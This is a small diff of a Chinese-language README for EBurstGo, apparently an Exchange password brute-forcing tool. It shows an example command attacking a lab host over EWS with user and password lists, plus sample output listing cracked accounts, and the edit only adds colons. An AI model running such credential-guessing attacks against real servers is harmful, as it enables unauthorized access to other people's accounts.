@@ -58,12 +58,12 @@ brute
 
 ```shell
 $ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user users.txt -pass pass.txt -mode ews
-[*] 使用 ews 接口爆破 https://192.168.30.11
-[+] 成功 Administrator:abcd1234!@#$
-[+] 成功 Alice:Alice123!
-[+] 成功 Bob:Bob123!
-[+] 成功 Marry:Marry123!
-[*] 耗时 4.40084275s
+[*] 使用 ews 接口爆破: https://192.168.30.11
+[+] 成功: Administrator:abcd1234!@#$
+[+] 成功: Alice:Alice123!
+[+] 成功: Bob:Bob123!
+[+] 成功: Marry:Marry123!
+[*] 耗时: 4.40084275s
 ```
 
 协程数不建议开太大, 可能会漏报 (待解决?)
